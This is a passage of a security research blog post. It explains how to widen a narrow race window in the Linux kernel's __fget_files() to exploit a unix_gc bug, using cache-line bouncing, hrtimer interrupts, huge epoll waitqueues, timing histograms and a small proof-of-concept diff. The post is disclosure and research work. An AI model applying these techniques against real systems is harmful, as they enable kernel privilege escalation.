 <p class="c3"><span>There are multiple race conditions involved in exploiting this bug, but by far the trickiest to hit is that we have to race an operation into the tiny race window in the middle of </span><span class="c4">__fget_files()</span><span>&nbsp;(which can e.g. be reached via </span><span class="c4">dup()</span><span class="c1">), between the file descriptor table lookup and the refcount increment:</span></p>
 <p class="c0"><span class="c1"></span></p>
 <p class="c3"><span class="c2">static struct file *__fget_files(struct files_struct *files, unsigned int fd,</span></p>
 <p class="c3"><span class="c2">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;fmode_t mask, unsigned int refs)</span></p>
 <p class="c3"><span class="c2">{</span></p>
 <p class="c3"><span class="c2">&nbsp; &nbsp; &nbsp; &nbsp; struct file *file;</span></p>
 <p class="c0"><span class="c2"></span></p>
 <p class="c3"><span class="c2">&nbsp; &nbsp; &nbsp; &nbsp; rcu_read_lock();</span></p>
 <p class="c3"><span class="c2">loop:</span></p>
 <p class="c3"><span class="c4 c9">&nbsp; &nbsp; &nbsp; &nbsp; file = </span><span class="c6 c18 c9">files_lookup_fd_rcu(files, fd)</span><span class="c4 c9">; </span><span class="c5">// race window start</span></p>
 <p class="c3"><span class="c2">&nbsp; &nbsp; &nbsp; &nbsp; if (file) {</span></p>
 <p class="c3"><span class="c2">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; /* File object ref couldn&#39;t be taken.</span></p>
 <p class="c3"><span class="c2">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;* dup2() atomicity guarantee is the reason</span></p>
 <p class="c3"><span class="c2">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;* we loop to catch the new file (or NULL pointer)</span></p>
 <p class="c3"><span class="c2">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;*/</span></p>
 <p class="c3"><span class="c2">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if (file-&gt;f_mode &amp; mask)</span></p>
 <p class="c3"><span class="c2">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; file = NULL;</span></p>
 <p class="c3"><span class="c4 c9">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; else if (!</span><span class="c6 c9 c18">get_file_rcu_many(file, refs)</span><span class="c4 c9">) </span><span class="c5">// race window end</span></p>
 <p class="c3"><span class="c2">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; goto loop;</span></p>
 <p class="c3"><span class="c2">&nbsp; &nbsp; &nbsp; &nbsp; }</span></p>
 <p class="c3"><span class="c2">&nbsp; &nbsp; &nbsp; &nbsp; rcu_read_unlock();</span></p>
 <p class="c0"><span class="c2"></span></p>
 <p class="c3"><span class="c2">&nbsp; &nbsp; &nbsp; &nbsp; return file;</span></p>
 <p class="c3"><span class="c2">}</span></p>
 <p class="c0"><span class="c1"></span></p>
 <p class="c3"><span>In this race window</span><span>, th</span><span>e file descriptor must be closed (to drop the FD&#39;s reference to the file) and a </span><span class="c4">unix_gc()</span><span>&nbsp;run must get past the point where it checks the file&#39;s refcount (&quot;</span><span class="c4 c24">total_refs = file_count(u-&gt;sk.sk_socket-&gt;file)</span><span class="c1">&quot;).</span></p>
 <p class="c0"><span class="c1"></span></p>
 <p class="c3"><span class="c1">In the Debian 5.10.0-9-amd64 kernel at version 5.10.70-1, that race window looks as follows:</span></p>
 <p class="c0"><span class="c1"></span></p>
 <p class="c3"><span class="c2">&lt;__fget_files+0x1e&gt; cmp &nbsp; &nbsp;r10,rax</span></p>
 <p class="c3"><span class="c2">&lt;__fget_files+0x21&gt; sbb &nbsp; &nbsp;rax,rax</span></p>
 <p class="c3"><span class="c2">&lt;__fget_files+0x24&gt; mov &nbsp; &nbsp;rdx,QWORD PTR [r11+0x8]</span></p>
 <p class="c3"><span class="c2">&lt;__fget_files+0x28&gt; and &nbsp; &nbsp;eax,r8d</span></p>
 <p class="c3"><span class="c2">&lt;__fget_files+0x2b&gt; lea &nbsp; &nbsp;rax,[rdx+rax*8]</span></p>
 <p class="c3"><span class="c4 c9">&lt;__fget_files+0x2f&gt; mov &nbsp; &nbsp;r12,QWORD PTR [rax] </span><span class="c22 c6 c18 c9">; RACE WINDOW START</span></p>
 <p class="c3"><span class="c22 c6 c18 c9">; r12 now contains file*</span></p>
 <p class="c3"><span class="c2">&lt;__fget_files+0x32&gt; test &nbsp; r12,r12</span></p>
 <p class="c3"><span class="c2">&lt;__fget_files+0x35&gt; je &nbsp; &nbsp; ffffffff812e3df7 &lt;__fget_files+0x77&gt;</span></p>
 <p class="c3"><span class="c2">&lt;__fget_files+0x37&gt; mov &nbsp; &nbsp;eax,r9d</span></p>
 <p class="c3"><span class="c4 c9">&lt;__fget_files+0x3a&gt; and &nbsp; &nbsp;eax,DWORD PTR [r12+0x44] </span><span class="c6 c18 c9 c22">; LOAD (for -&gt;f_mode)</span></p>
 <p class="c3"><span class="c2">&lt;__fget_files+0x3f&gt; jne &nbsp; &nbsp;ffffffff812e3df7 &lt;__fget_files+0x77&gt;</span></p>
 <p class="c3"><span class="c4 c9">&lt;__fget_files+0x41&gt; mov &nbsp; &nbsp;rax,QWORD PTR [r12+0x38] </span><span class="c22 c6 c18 c9">; LOAD (for -&gt;f_count)</span></p>
 <p class="c3"><span class="c2">&lt;__fget_files+0x46&gt; lea &nbsp; &nbsp;rdx,[r12+0x38]</span></p>
 <p class="c3"><span class="c2">&lt;__fget_files+0x4b&gt; test &nbsp; rax,rax</span></p>
 <p class="c3"><span class="c2">&lt;__fget_files+0x4e&gt; je &nbsp; &nbsp; ffffffff812e3def &lt;__fget_files+0x6f&gt;</span></p>
 <p class="c3"><span class="c2">&lt;__fget_files+0x50&gt; lea &nbsp; &nbsp;rcx,[rsi+rax*1]</span></p>
 <p class="c3"><span class="c4 c9">&lt;__fget_files+0x54&gt; lock cmpxchg QWORD PTR [rdx],rcx </span><span class="c6 c18 c9">; RACE WINDOW END (on cmpxchg success)</span></p>
 <p class="c0"><span class="c1"></span></p>
 <p class="c3"><span>As you can see, the race window is fairly small - around 12 instructions, assuming that the </span><span class="c4">cmpxchg</span><span class="c1">&nbsp;succeeds.</span></p><h1 class="c15" id="h.dhdzjamcop53"><span class="c8">Missing some cache</span></h1>
 <p class="c3"><span>Luckily for us, the race window contains the first few memory accesses to the </span><span class="c4">struct file</span><span>; therefore, by making sure that the </span><span class="c4">struct file</span><span>&nbsp;is not present in the fastest CPU caches, we can widen the race window by as much time as the memory accesses take. The standard way to do this is to use </span><span>an eviction pattern</span><span>&nbsp;/ </span><span class="c11"><a class="c121" href="https://www.cs.columbia.edu/~simha/spyjs.ccs15.pdf">eviction set</a></span><span>; but instead we can also make the cache line dirty on another core (see </span><span class="c11"><a class="c121" href="https://dreamsofastone.blogspot.com/2016/02/row-hammer-java-script-and-mesi.html">Anders Fogh&#39;s blogpost</a></span><span>&nbsp;for more detail). (I&#39;m not actually sure about the intricacies of how much latency this adds on different manufacturers&#39; CPU cores, or on different CPU generations - I&#39;ve only tested different versions of my proof-of-concept on Intel Skylake and Tiger Lake. Differences in cache </span><span>coherency</span><span class="c1">&nbsp;protocols or snooping might make a big difference.)</span></p>
 <p class="c0"><span class="c1"></span></p>
 <p class="c3"><span>For the cache line containing the flags and refcount of a </span><span class="c4">struct file</span><span>, this can be done by, on another CPU, temporarily bumping its refcount up and then changing it back down, e.g. with </span><span class="c4">close(dup(fd))</span><span class="c1">&nbsp;(or just by accessing the FD in pretty much any way from a multithreaded process).</span></p>
 <p class="c0"><span class="c1"></span></p>
 <p class="c3"><span>However, when we&#39;re trying to hit the race in </span><span class="c4">__fget_files()</span><span>&nbsp;via </span><span class="c4">dup()</span><span>, we don&#39;t want any cache misses to occur before we hit the race window - that would slow us down and probably make us miss the race. To prevent that from happening, we can call </span><span class="c4">dup()</span><span class="c1">&nbsp;with a different FD number for a warm-up run shortly before attempting the race. Because we also want the relevant cache line in the FD table to be hot, we should choose the FD number for the warm-up run such that it uses the same cache line of the file descriptor table.</span></p><h1 class="c15" id="h.pfod85irgmms"><span class="c8">An interruption</span></h1>
 <p class="c3"><span>Okay, a cache miss might be something like a few dozen or maybe hundred nanoseconds or so - that&#39;s better, but it&#39;s not </span><span class="c16">great</span><span>. What </span><span>else can we do to make this tiny</span><span class="c1">&nbsp;piece of code much slower to execute?</span></p>
 <p class="c0"><span class="c1"></span></p>
 <p class="c3"><span>On Android, kernels normally set </span><span class="c4">CONFIG_PREEMPT</span><span>, which would&#39;ve allowed abusing the scheduler to somehow interrupt the execution of this code. The way I&#39;ve done this in the past was to give the victim thread a low scheduler priority and pin it to a specific CPU core together with another high-priority thread that is blocked on a </span><span class="c4">read()</span><span class="c1">&nbsp;syscall on an empty pipe (or eventfd); when data is written to the pipe from another CPU core, the pipe becomes readable, so the high-priority thread (which is registered on the pipe&#39;s waitqueue) becomes schedulable, and an inter-processor interrupt (IPI) is sent to the victim&#39;s CPU core to force it to enter the scheduler immediately.</span></p>
 <p class="c0"><span class="c1"></span></p>
 <p class="c3"><span>One problem with that approach, aside from its reliance on </span><span class="c4">CONFIG_PREEMPT</span><span class="c1">, is that any timing variability in the kernel code involved in sending the IPI makes it harder to actually preempt the victim thread in the right spot.</span></p>
 <p class="c0"><span class="c1"></span></p>
 <p class="c3"><span>(Thanks to the </span><span class="c11"><a class="c121" href="https://xenproject.org/users/security/">Xen security team</a></span><span class="c1">&nbsp;- I think the first time I heard the idea of using an interrupt to widen a race window might have been from them.)</span></p><h1 class="c15" id="h.u9iu9sq2l8r"><span>Setting an alarm</span></h1>
 <p class="c3"><span>A better way to do this on an Android phone would be to trigger the scheduler not from an IPI, but from an expiring high-resolution timer on the same core</span><span>, although I didn&#39;t get it to work (probably because my code was broken in unrelated ways)</span><span class="c1">.</span></p>
 <p class="c0"><span class="c1"></span></p>
 <p class="c3"><span>High-resolution timers (hrtimers) are exposed through many userspace APIs. Even the timeout of </span><span class="c4">select()</span><span>/</span><span class="c4">pselect()</span><span>&nbsp;uses an hrtimer, although this is an hrtimer that normally has some slack applied to it to allow batching it with timers that are scheduled to expire a bit later. An example of a non-hrtimer-based API is the timeout used for reading from a UNIX domain socket (and probably also other types of sockets?), which can be set via </span><span class="c4">SO_RCVTIMEO</span><span class="c1">.</span></p>
 <p class="c0"><span class="c1"></span></p>
 <p class="c3"><span>The thing that makes hrtimers &quot;high-resolution&quot; is that they don&#39;t just wait for the next periodic clock tick to arrive; instead, the expiration time of the next hrtimer on the CPU core is programmed into a hardware timer. So we could set an absolute hrtimer for some time in the future via something like </span><span class="c4">timer_settime()</span><span>&nbsp;or </span><span class="c4">timerfd_settime()</span><span class="c1">, and then at exactly the programmed time, the hardware will raise an interrupt! We&#39;ve made the timing behavior of the OS irrelevant for the second side of the race, the only thing that matters is the hardware! Or... well, almost...</span></p><h1 class="c15" id="h.v6rvu85hdhx3"><span class="c8">[Sidenote] Absolute timers: Not quite absolute</span></h1>
 <p class="c3"><span>So we pick some absolute time at which we want to be interrupted, and tell the kernel using a syscall that accepts an absolute time, in nanoseconds. And then when that timer is the next one scheduled, the OS converts the absolute time to whatever clock base/scale the hardware timer is based on, and programs it into hardware. And the hardware usually supports programming timers with absolute time - e.g. on modern X86 (with </span><span class="c4">X86_FEATURE_TSC_DEADLINE_TIMER</span><span>), you can simply write an absolute Time Stamp Counter(TSC) deadline into </span><span class="c4">MSR_IA32_TSC_DEADLINE</span><span>, and when that deadline is reached, you get an interrupt. The situation on arm64 is similar, using the timer&#39;s comparator register (</span><span class="c4">CVAL</span><span class="c1">).</span></p>
 <p class="c0"><span class="c1"></span></p>
 <p class="c3"><span>However, on both X86 and arm64, even though the clockevent subsystem is theoretically able to give absolute timestamps to clockevent drivers (via </span><span class="c4">-&gt;set_next_ktime()</span><span>), the drivers instead only implement </span><span class="c4">-&gt;set_next_event()</span><span class="c1">, which takes a relative time as argument. This means that the absolute timestamp has to be converted into a relative one, only to be converted back to absolute a short moment later. The delay between those two operations is essentially added to the timer&#39;s expiration time.</span></p>
 <p class="c0"><span class="c1"></span></p>
 <p class="c3"><span>Luckily this didn&#39;t really seem to be a problem for me; if it was, I would have tried to repeatedly call </span><span class="c4">timerfd_settime()</span><span>&nbsp;shortly before the planned expiry time to ensure that the last time the hardware timer is programmed, the relevant code path is hot in the caches. (I did do some experimentation on arm64, where this seemed to </span><span class="c16">maybe</span><span>&nbsp;help a tiny bit, but I didn&#39;t really analyze it properly.)</span></p><h1 class="c15" id="h.dtkpi9hjsrrs"><span class="c8">A really big list of things to do</span></h1>
 <p class="c3"><span>Okay, so all the stuff I said above would be helpful on an Android phone with </span><span class="c4">CONFIG_PREEMPT</span><span class="c1">, but what if we&#39;re trying to target a normal desktop/server kernel that doesn&#39;t have that turned on?</span></p>
 <p class="c0"><span class="c1"></span></p>
 <p class="c3"><span class="c1">Well, we can still trigger hrtimer interrupts the same way - we just can&#39;t use them to immediately enter the scheduler and preempt the thread anymore. But instead of using the interrupt for preemption, we could just try to make the interrupt handler run for a really long time.</span></p>
 <p class="c0"><span class="c1"></span></p>
 <p class="c3"><span>Linux has the concept of a &quot;timerfd&quot;, which is a file descriptor that refers to a timer. You can e.g. call </span><span class="c4">read()</span><span class="c1">&nbsp;on a timerfd, and that operation will block until the timer has expired. Or you can monitor the timerfd using epoll, and it will show up as readable when the timer expires.</span></p>
 <p class="c0"><span class="c1"></span></p>
 <p class="c3"><span>When a timerfd becomes ready, all the timerfd&#39;s waiters (including epoll watches), which are queued up in a linked list, are woken up via the </span><span class="c4">wake_up()</span><span class="c1">&nbsp;path - just like when e.g. a pipe becomes readable. Therefore, if we can make the list of waiters really long, the interrupt handler will have to spend a lot of time iterating over that list.</span></p>
 <p class="c0"><span class="c1"></span></p>
 <p class="c3"><span>And for any waitqueue that is wired up to a file descriptor, it is fairly easy to add a ton of entries thanks to epoll. Epoll ties its watches to specific FD numbers, so if you duplicate an FD with hundreds of </span><span class="c4">dup()</span><span class="c1">&nbsp;calls, you can then use a single epoll instance to install hundreds of waiters on the file. Additionally, a single process can have lots of epoll instances. I used 500 epoll instances and 100 duplicate FDs, resulting in 50 000 waitqueue items.</span></p><h1 class="c15" id="h.gyrfobw0uoov"><span>Measuring race outcomes</span></h1>
 <p class="c3"><span>A nice aspect of this race condition is that if you only hit the difficult race (</span><span class="c4">close()</span><span>&nbsp;the FD and run </span><span class="c4">unix_gc()</span><span>&nbsp;while </span><span class="c4">dup()</span><span class="c1">&nbsp;is preempted between FD table lookup and refcount increment), no memory corruption happens yet, but you can observe that the GC has incorrectly removed a socket buffer (SKB) from the victim socket. Even better, if the race fails, you can also see in which direction it failed, as long as no FDs below the victim FD are unused:</span></p>
 <p class="c0"><span class="c1"></span></p><ul style="padding: 0;" class="c20 lst-kix_oh8g77k3z2ge-0 start"><li style="margin-left: 46pt;" class="c3 c14 li-bullet-0"><span>If </span><span class="c4">dup()</span><span>&nbsp;returns -1, it was called too late / the interrupt happened too soon: The </span><span class="c4">file*</span><span>&nbsp;was already gone from the FD table when </span><span class="c4">__fget_files()</span><span class="c1">&nbsp;tried to load it.</span></li><li style="margin-left: 46pt;" class="c3 c14 li-bullet-0"><span>If </span><span class="c4">dup()</span><span class="c1">&nbsp;returns a file descriptor:</span></li></ul><ul style="padding: 0;" class="c20 lst-kix_oh8g77k3z2ge-1 start"><li style="margin-left: 46pt;" class="c3 c21 li-bullet-0"><span>If it returns an FD higher than the victim FD, this implies that the victim FD was only closed after </span><span class="c4">dup()</span><span>&nbsp;had already elevated the refcount and allocated a new FD. This means </span><span class="c4">dup()</span><span class="c1">&nbsp;was called too soon / the interrupt happened too late.</span></li><li style="margin-left: 46pt;" class="c3 c21 li-bullet-0"><span class="c1">If it returns the old victim FD number:</span></li></ul><ul style="padding: 0;" class="c20 lst-kix_oh8g77k3z2ge-2 start"><li style="margin-left: 46pt;" class="c3 c17 li-bullet-0"><span>If </span><span class="c4">recvmsg()</span><span>&nbsp;on the FD returned by </span><span class="c4">dup()</span><span class="c1">&nbsp;returns no data, it means the race succeeded: The GC wrongly removed the queued SKB.</span></li><li style="margin-left: 46pt;" class="c3 c17 li-bullet-0"><span>If </span><span class="c4">recvmsg()</span><span>&nbsp;returns data, the interrupt happened between the refcount increment and the allocation of a new FD. </span><span class="c4">dup()</span><span class="c1">&nbsp;was called a little bit too soon / the interrupt happened a little bit too late.</span></li></ul>
 <p class="c0"><span class="c1"></span></p>
 <p class="c3"><span class="c1">Based on this, I repeatedly tested different timing offsets, using a spinloop with a variable number of iterations to skew the timing, and plotted what outcomes the race attempts had depending on the timing skew.</span></p><h2 class="c26" id="h.8e0qhvge46uf"><span class="c22 c23">Results: Debian kernel, on Tiger Lake</span></h2>
 <p class="c3"><span class="c1">I tested this on a Tiger Lake laptop, with the same kernel as shown in the disassembly. Note that &quot;0&quot; on the X axis is offset -300 ns relative to the timer&#39;s programmed expiry.</span></p>
 <p class="c0"><span class="c1"></span></p>
 <p class="c3"></p>
  
 <p class="c3"><span><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjxGtaXjmnSP7rJxi3RT9dLvnD5tGCVK-JFz8h3JVDjIDQ_2j-MpgyVqVJjh4zsldFBzadavB4_9nLx9KQ_fMSRHksfZM807yXykEgetDNCmeOzM21njTe8H9qH79Kz2MgqNL-5XWbxMy5fj9NamgjI15-5QZwJyn0NvHQwFuAw2z99_0lKwfrcWm4a/s580/image12.png" style="display: block; padding: 1em 0;text-align: center;"><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjxGtaXjmnSP7rJxi3RT9dLvnD5tGCVK-JFz8h3JVDjIDQ_2j-MpgyVqVJjh4zsldFBzadavB4_9nLx9KQ_fMSRHksfZM807yXykEgetDNCmeOzM21njTe8H9qH79Kz2MgqNL-5XWbxMy5fj9NamgjI15-5QZwJyn0NvHQwFuAw2z99_0lKwfrcWm4a/s580/image12.png" border="0" alt="This graph shows histograms of race attempt outcomes (too early, success, or too late), with the timing offset at which the outcome occurred on the X axis. The graph shows that depending on the timing offset, up to around 1/3 of race attempts succeeded." style="max-height: 750; max-width: 600px;"title="This graph shows histograms of race attempt outcomes (too early, success, or too late), with the timing offset at which the outcome occurred on the X axis. The graph shows that depending on the timing offset, up to around 1/3 of race attempts succeeded." /></a></span></p><h2 class="c26" id="h.9b7pdk4c8xov"><span>Results: Other kernel, on Skylake</span></h2>
 <p class="c0"><span class="c1"></span></p>
 <p class="c3"></p>
  
 <p class="c3"><span class="c1"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjer2duEFeMBnPTJc3X7kT-FPCR1yx9UFEABwrTUxFKOs-gFkM_N-XnkWxPbhg31yka-2b5CFBBnOeAmrVAr41WfzKKPUBoF1dDBRpaX0tPGpu4w8p5aBZrxewYuGl1A_CDt0CojQqK44ue86r9PI8HnBtD2IR3NJDAI8O4TByvvx5fFe0sMdmHYZ6b/s652/image8%283%29.png" style="display: block; padding: 1em 0;text-align: center;"><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjer2duEFeMBnPTJc3X7kT-FPCR1yx9UFEABwrTUxFKOs-gFkM_N-XnkWxPbhg31yka-2b5CFBBnOeAmrVAr41WfzKKPUBoF1dDBRpaX0tPGpu4w8p5aBZrxewYuGl1A_CDt0CojQqK44ue86r9PI8HnBtD2IR3NJDAI8O4TByvvx5fFe0sMdmHYZ6b/s652/image8%283%29.png" border="0" alt="This graph shows similar histograms for a Skylake processor. The exact distribution is different, but again, depending on the timing offset, around 1/3 of race attempts succeeded." style="max-height: 750; max-width: 600px;"title="This graph shows similar histograms for a Skylake processor. The exact distribution is different, but again, depending on the timing offset, around 1/3 of race attempts succeeded." /></a></span></p>
 <p class="c0"><span class="c1"></span></p>
 <p class="c3"><span>These measurements are from an older laptop with a Skylake CPU, running a different kernel. Here &quot;0&quot; on the X axis is offset -1 us relative to the timer. (T</span><span>hese timings are from a system that&#39;s running a different kernel from </span><span class="c1">the one shown above, but I don&#39;t think that makes a difference.)</span></p>
 <p class="c0"><span class="c1"></span></p>
 <p class="c3"><span class="c1">The exact timings of course look different between CPUs, and they probably also change based on CPU frequency scaling? But still, if you know what the right timing is (or measure the machine&#39;s timing before attempting to actually exploit the bug), you could hit this narrow race with a success rate of about 30%!</span></p>
 <p class="c0"><span class="c1"></span></p><h1 class="c15" id="h.5qhkbks84bg2"><span class="c8">How important is the cache miss?</span></h1>
 <p class="c3"><span>The previous section showed that with the right timing, the race succeeds with a probability around 30% - but it doesn&#39;t show whether the cache miss is actually important for that, or whether the race would still work fine without it. To verify that, I patched my test code to try to make the file&#39;s </span><span>cache line hot (present in the cache) instead of cold (not present in the cache):</span></p>
 <p class="c0"><span class="c1"></span></p>
 <p class="c3"><span class="c10 c4">@@ -312,8 +312,10 @@</span></p>
 <p class="c3"><span class="c10 c4">&nbsp; &nbsp; &nbsp;}</span></p>
 <p class="c3"><span class="c10 c4">&nbsp;</span></p>
 <p class="c3"><span class="c10 c4">+#if 0</span></p>
 <p class="c3"><span class="c10 c4">&nbsp; &nbsp; &nbsp;// bounce socket&#39;s file refcount over to other cpu</span></p>
 <p class="c3"><span class="c10 c4">&nbsp; &nbsp; &nbsp;pin_to(2);</span></p>
 <p class="c3"><span class="c10 c4">&nbsp; &nbsp; &nbsp;close(SYSCHK(dup(RESURRECT_FD+1-1)));</span></p>
 <p class="c3"><span class="c4 c10">&nbsp; &nbsp; &nbsp;pin_to(1);</span></p>
 <p class="c3"><span class="c10 c4">+#endif</span></p>
 <p class="c3"><span class="c10 c4">&nbsp;</span></p>
 <p class="c3"><span class="c4 c24">&nbsp; &nbsp; &nbsp;//printf(&quot;setting timer\n&quot;);</span></p>
 <p class="c3"><span class="c10 c4">@@ -352,5 +354,5 @@</span></p>
 <p class="c3"><span class="c10 c4">&nbsp; &nbsp; &nbsp;close(loop_root);</span></p>
 <p class="c3"><span class="c10 c4">&nbsp; &nbsp; &nbsp;while (ts_is_in_future(spin_stop))</span></p>
 <p class="c3"><span class="c10 c4">- &nbsp; &nbsp; &nbsp;close(SYSCHK(dup(FAKE_RESURRECT_FD)));</span></p>
 <p class="c3"><span class="c10 c4">+ &nbsp; &nbsp; &nbsp;close(SYSCHK(dup(RESURRECT_FD)));</span></p>
 <p class="c3"><span class="c10 c4">&nbsp; &nbsp; &nbsp;while (ts_is_in_future(my_launch_ts)) /*spin*/;</span></p>
 <p class="c0"><span class="c1"></span></p>
 <p class="c3"><span class="c1">With that patch, the race outcomes look like this on the Tiger Lake laptop:</span></p>
 <p class="c0"><span class="c1"></span></p>
 <p class="c3"></p>
 
 
 <p class="c3"><span class="c1"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh7ABFgzZ7f8Mx5-JqYX4cjg23oXIbYr90vK32VO2evlWS2ADk3IM_Oh7AqguoJOEkF2A20aBhazVB5YqC7w5HgdmW73YqBhepK02B_EpBU0MSmbSIanUrFQwZizZAyF1cp2UNMMfG2xd_Z5byu2kqFejEuzWJ26piIR-0qY_uSGlfSfYmfq9SvLp9Z/s659/image2%284%29.png" style="display: block; padding: 1em 0;text-align: center;"><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh7ABFgzZ7f8Mx5-JqYX4cjg23oXIbYr90vK32VO2evlWS2ADk3IM_Oh7AqguoJOEkF2A20aBhazVB5YqC7w5HgdmW73YqBhepK02B_EpBU0MSmbSIanUrFQwZizZAyF1cp2UNMMfG2xd_Z5byu2kqFejEuzWJ26piIR-0qY_uSGlfSfYmfq9SvLp9Z/s659/image2%284%29.png" border="0" alt="This graph is a histogram of race outcomes depending on timing offset; it looks similar to the previous graphs, except that almost no race attempts succeed anymore." style="max-height: 750; max-width: 600px;"title="This graph is a histogram of race outcomes depending on timing offset; it looks similar to the previous graphs, except that almost no race attempts succeed anymore." /></a></span></p><h1 class="c15" id="h.7bhmtfdoxeqe"><span class="c8">But wait, those graphs make no sense!</span></h1>
 <p class="c3"><span class="c1">If you&#39;ve been paying attention, you may have noticed that the timing graphs I&#39;ve been showing are really weird. If we were deterministically hitting the race in exactly the same way every time, the timing graph should look like this (looking just at the &quot;too-early&quot; and &quot;too-late&quot; cases for simplicity):</span></p>
 <p class="c3"></p>
  
 <p class="c3"><span class="c1"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi6T1QCwcnTS3XMWs-pRes47xC-6ruTCFYUU9ZxoO-OYZs3BX3Je5ZxXllb-obFMJsGo9ueKu6y5e5CorRtrVbIHf4YIWAGrLV7Gz3wRS-QzF1UG3AxK__fRQ-PC6MkCnxH3dlKDG5ueJR8bITiorTkicLIhYJg910YC3fY5_m4sf64GYWtOnIPbKDE/s359/image6%283%29.png" style="display: block; padding: 1em 0;text-align: center;"><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi6T1QCwcnTS3XMWs-pRes47xC-6ruTCFYUU9ZxoO-OYZs3BX3Je5ZxXllb-obFMJsGo9ueKu6y5e5CorRtrVbIHf4YIWAGrLV7Gz3wRS-QzF1UG3AxK__fRQ-PC6MkCnxH3dlKDG5ueJR8bITiorTkicLIhYJg910YC3fY5_m4sf64GYWtOnIPbKDE/s359/image6%283%29.png" border="0" alt="A sketch of a histogram of race outcomes where the &quot;too early&quot; outcome suddenly drops from 100% probability to 0% probability, and a bit afterwards, the &quot;too late&quot; outcome jumps from 0% probability to 100%" style="max-height: 750; max-width: 600px;"title="A sketch of a histogram of race outcomes where the &quot;too early&quot; outcome suddenly drops from 100% probability to 0% probability, and a bit afterwards, the &quot;too late&quot; outcome jumps from 0% probability to 100%" /></a></span></p>
 <p class="c0"><span class="c1"></span></p>
 <p class="c3"><span class="c1">Sure, maybe there is some microarchitectural state that is different between runs, causing timing variations - cache state, branch predictor state, frequency scaling, or something along those lines -, but a small number of discrete events that haven&#39;t been accounted for should be adding steps to the graph. (If you&#39;re mathematically inclined, you can model that as the result of a convolution of the ideal timing graph with the timing delay distributions of individual discrete events.) For two unaccounted events, that might look like this:</span></p>
 <p class="c3"></p>
  

 <p class="c3"><span class="c1"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj2Y9DapfGb7NRtbz3j0aEQlA4SLZgk1ttbc7rS-0ZPbgerGJlqgk-N_Bna8AfcY8J2HBaHo2VJ0x-AR5n9lvivwdjmzKkITRIcypqYSBkOXB0DpavJ9dURyIfbA0u0D0KUOU1JD2pIH8KW2f8AQffaWluuQayXFq_8bleRLPfLZHmAkeLjFbJXxDVA/s359/image18.png" style="display: block; padding: 1em 0;text-align: center;"><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj2Y9DapfGb7NRtbz3j0aEQlA4SLZgk1ttbc7rS-0ZPbgerGJlqgk-N_Bna8AfcY8J2HBaHo2VJ0x-AR5n9lvivwdjmzKkITRIcypqYSBkOXB0DpavJ9dURyIfbA0u0D0KUOU1JD2pIH8KW2f8AQffaWluuQayXFq_8bleRLPfLZHmAkeLjFbJXxDVA/s359/image18.png" border="0" alt="A sketch of a histogram of race outcomes where the &quot;too early&quot; outcome drops from 100% probability to 0% probability in multiple discrete steps, and overlapping that, the &quot;too late&quot; outcome goes up from 0% probability to 100% in multiple discrete steps" style="max-height: 750; max-width: 600px;"title="A sketch of a histogram of race outcomes where the &quot;too early&quot; outcome drops from 100% probability to 0% probability in multiple discrete steps, and overlapping that, the &quot;too late&quot; outcome goes up from 0% probability to 100% in multiple discrete steps" /></a></span></p>
 <p class="c3"><span class="c1">But what the graphs are showing is more of a smooth, linear transition, like this:</span></p>
 <p class="c3"></p>
  
 <p class="c3"><span class="c1"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjV2n4po9tRvp9j-aHeINv6S3q7YVcSdHocobXnfLZQnkg8kQqh2wx-Q8-gBX6MNFLgAibZwVoUQwOAX-HDCK3aGCRt8rroQtcmw4Kyl9JNoVJb_ldqhj5sVW7CtlA-HFMyI45HPDYfWJD-ck2NpU2ZFFh35gVzmekcAdtlUv3fGVZ8p_Muec3rMbDJ/s359/image13.png" style="display: block; padding: 1em 0;text-align: center;"><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjV2n4po9tRvp9j-aHeINv6S3q7YVcSdHocobXnfLZQnkg8kQqh2wx-Q8-gBX6MNFLgAibZwVoUQwOAX-HDCK3aGCRt8rroQtcmw4Kyl9JNoVJb_ldqhj5sVW7CtlA-HFMyI45HPDYfWJD-ck2NpU2ZFFh35gVzmekcAdtlUv3fGVZ8p_Muec3rMbDJ/s359/image13.png" border="0" alt="A sketch of a histogram of race outcomes where the &quot;too early&quot; outcome&#39;s share linearly drops while the &quot;too late&quot; outcome&#39;s share linearly rises" style="max-height: 750; max-width: 600px;"title="A sketch of a histogram of race outcomes where the &quot;too early&quot; outcome&#39;s share linearly drops while the &quot;too late&quot; outcome&#39;s share linearly rises" /></a></span></p>
 <p class="c0"><span class="c1"></span></p>
